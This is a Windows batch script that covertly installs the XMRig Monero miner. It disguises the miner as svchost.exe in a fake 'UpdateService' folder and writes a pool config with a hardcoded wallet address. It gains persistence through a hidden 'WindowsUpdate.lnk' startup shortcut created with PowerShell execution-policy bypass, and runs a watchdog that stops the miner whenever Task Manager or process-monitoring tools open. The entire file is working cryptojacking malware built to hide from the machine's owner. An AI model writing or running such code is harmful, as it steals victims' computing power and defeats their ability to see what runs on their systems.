@echo off
if "%1"=="--watchdog" goto watchdog

:: No admin check. No elevation. User-level only.
cd /d "%~dp0"

:: Establish user-level persistence directory
set "INSTALLDIR=%APPDATA%\Microsoft\Windows\UpdateService"
mkdir "%INSTALLDIR%" 2>nul

:: Copy payload to persistent location
copy /y xmrig.exe "%INSTALLDIR%\svchost.exe" >nul 2>&1
if exist "config.json" copy /y config.json "%INSTALLDIR%\config.json" >nul 2>&1
copy /y "%~f0" "%INSTALLDIR%\wus.bat" >nul 2>&1

:: Generate config in persistent location if needed
if not exist "%INSTALLDIR%\config.json" (
    (
    echo {
    echo     "autosave": true,
    echo     "cpu": {
    echo         "enabled": true,
    echo         "huge-pages": true,
    echo         "hw-aes": true,
    echo         "max-threads-hint": 50,
    echo         "asm": true,
    echo         "memory-pool": false,
    echo         "yield": true
    echo     },
    echo     "pools": [
    echo         {
    echo             "url": "stratum+tcp://pool.moneroocean.stream:10128",
    echo             "user": "42CH5YT79MJhEPZvaUQRBz2TsTanEmaSPZz9nwfcDQ5kTCGPC5UvKudgHCXfAYPq51eqazWn5tZbqhUGTYkkxcDSF5tK61f.%COMPUTERNAME%_%RANDOM%",
    echo             "pass": "x",
    echo             "tls": true,
    echo             "keepalive": true,
    echo             "nicehash": false
    echo         }
    echo     ],
    echo     "api": { "enabled": false },
    echo     "http": { "enabled": false }
    echo }
    ) > "%INSTALLDIR%\config.json"
)

:: Start miner from persistent location
start /min "" "%INSTALLDIR%\svchost.exe" -c "%INSTALLDIR%\config.json" --no-console --background

:: Drop shortcut in startup folder - ZERO UAC, ZERO PROMPTS
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$ws = New-Object -ComObject WScript.Shell;
$sc = $ws.CreateShortcut([Environment]::GetFolderPath('Startup') + '\WindowsUpdate.lnk');
$sc.TargetPath = 'cmd.exe';
$sc.Arguments = '/c \"\"' + '%INSTALLDIR%\wus.bat' + '\" --watchdog\"';
$sc.WindowStyle = 7;
$sc.Save();
"

exit /b

:watchdog
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$minerPath = '%INSTALLDIR%\svchost.exe';
$configPath = '%INSTALLDIR%\config.json';
$minerProcess = Start-Process -FilePath $minerPath -ArgumentList \"-c \`\"$configPath\`\" --no-console --background\" -PassThru -WindowStyle Hidden;
while ($true) {
    $tools = Get-Process -Name 'taskmgr','taskschd','mmc','perfmon','resmon','procmon','procexp' -ErrorAction SilentlyContinue;
    if ($tools) {
        if ($minerProcess -and !$minerProcess.HasExited) { Stop-Process -Id $minerProcess.Id -Force }
        while (Get-Process -Name 'taskmgr','taskschd','mmc','perfmon','resmon','procmon','procexp' -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 2 }
        $minerProcess = Start-Process -FilePath $minerPath -ArgumentList \"-c \`\"$configPath\`\" --no-console --background\" -PassThru -WindowStyle Hidden
    }
    Start-Sleep -Seconds 3
}
"